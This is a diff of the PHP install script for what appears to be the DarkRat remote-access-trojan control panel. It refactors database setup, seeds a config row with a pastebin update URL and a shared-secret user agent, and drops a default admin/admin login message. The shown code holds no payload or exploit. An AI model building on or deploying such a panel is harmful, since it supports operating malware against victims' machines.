@@ -16,6 +16,7 @@ class Install{
 
      public function index()
     {
+        $finishing = false;
         //uUog~{qyTKN{
         if(!empty($_POST)){
                 //$mysqldatabaseRand = $this->generateRandomString(2);
@@ -110,7 +111,7 @@ CREATE TABLE `config` (
 --
 
 INSERT INTO `config` (`id`, `enryptionkey`, `check_update_url`, `useragent`, `template`, `plugins`) VALUES
-(1, 'KQC', 'https://pastebin.com/raw/YBGEBviB', 'somesecret', 'v1', ',,,,,,,,,,,,,,,,,,,,,,,,');
+(1, 'KQC', 'https://pastebin.com/raw/YBGEBviB', 'somesecret', 'v2', '');
 
 -- --------------------------------------------------------
 
@@ -267,24 +268,19 @@ ALTER TABLE `users`
                 }catch(PDOException $e){
                     die($e->getmessage());
                 }
-                $string = "<?php \n %%%%pdo = new PDO('mysql:host=localhost;dbname=".$mysqldatabaseRand."', '".$mysqlusername."', '".$mysqlpassword."'); \n %%%%pdo->exec(\"SET CHARACTER SET utf8\");";
-                file_put_contents(__DIR__."/../../../../../config.php",str_replace("%%%%","$",$string));
 
 
                 if($databaseErrors[2] == NULL){
-                    echo "
-                DarkRat is Installed<br>
-                Please Change Default Login in the Admin Center
-                <hr>
-                Username: admin<br>
-                Password: admin<br>
-                    <br>
-                <a href='/login'>Click Me to Login</a>
-                ";
+                    $finishing = true;
                 }else{
                     var_dump($databaseErrors);
+                    die();
                 }
-                die();
+
+            $string = "<?php \n %%%%pdo = new PDO('mysql:host=localhost;dbname=".$mysqldatabaseRand."', '".$mysqlusername."', '".$mysqlpassword."'); \n %%%%pdo->exec(\"SET CHARACTER SET utf8\");";
+            file_put_contents(__DIR__."/../../../../../config.php",str_replace("%%%%","$",$string));
+
+
         }
 
        
@@ -328,7 +324,7 @@ ALTER TABLE `users`
                 }
 
             }
-
+            $GLOBALS["tpl"]->assign("finishing",$finishing);
             $GLOBALS["tpl"]->assign("return",$return);
 
     }
